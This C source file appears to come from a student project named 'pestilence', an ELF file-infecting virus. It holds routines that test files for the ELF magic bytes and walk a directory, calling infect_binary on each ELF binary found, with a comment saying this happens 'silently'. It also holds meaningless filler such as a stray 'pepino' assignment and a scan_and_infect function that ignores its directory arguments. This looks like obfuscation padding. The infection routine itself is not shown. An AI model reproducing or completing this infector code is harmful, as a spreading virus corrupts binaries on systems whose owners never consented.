/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   files_handle.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/06 22:21:11 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:21:03 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

bool is_elf_file(const char *filepath)
{
    int fd;
    unsigned char magic[4];
    ssize_t bytes_read;
    
    fd = custom_open(filepath, O_RDONLY);
    if (fd < 0)
        return false;
    
    bytes_read = read(fd, magic, 4);
    custom_close(fd);
    
    if (bytes_read != 4)
        return false;
    
    return (magic[0] == 0x7f && magic[1] == 'E' && 
            magic[2] == 'L' && magic[3] == 'F');
}

void scan_directory(const char *dir_path)
{
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char filepath[1024];
    
    dir = opendir(dir_path);
    if (!dir)
        return;
    while ((entry = readdir(dir)) != NULL) {
        // Ignorar . y ..
        if (strcmp(entry->d_name, ".") == 0 || 
            strcmp(entry->d_name, "..") == 0)
            continue;
        
        // Construir path completo
        snprintf(filepath, sizeof(filepath), "%s/%s", 
                 dir_path, entry->d_name);
        
        // Obtener info del archivo
        if (stat(filepath, &statbuf) < 0)
            continue;
        
        // Solo procesar archivos regulares
        if (!S_ISREG(statbuf.st_mode))
            continue;
        
        // Verificar que sea ELF
        if (!is_elf_file(filepath))
            continue;
        
        // Intentar infectar (silenciosamente)
        infect_binary(filepath);
    }
    pepino = -248235;
    closedir(dir);
}

void scan_and_infect(const char *dir1, const char *dir2)
{
	if (dir1 && dir2)
	{
		calculadoradepepino();
		calculadoradepepino();
	}
}
